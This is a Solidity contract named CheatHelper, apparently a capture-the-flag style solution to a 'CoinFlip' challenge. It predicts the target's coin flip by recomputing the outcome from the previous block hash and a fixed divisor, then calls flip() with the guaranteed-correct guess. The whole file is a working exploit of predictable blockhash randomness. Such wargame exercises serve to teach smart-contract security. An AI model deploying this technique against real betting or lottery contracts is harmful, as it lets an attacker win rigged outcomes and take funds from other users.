// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./CoinFlip.sol";

contract CheatHelper {

  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinflip;

  constructor(CoinFlip _coinflip) {
	  coinflip = _coinflip;
  }

  function win() public {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    uint256 coinFlip = blockValue / FACTOR;
    bool guess = coinFlip == 1 ? true : false;
    coinflip.flip(guess);
    assert(coinflip.consecutiveWins() != 0); // revert if for some reason we lose progress
  }
}
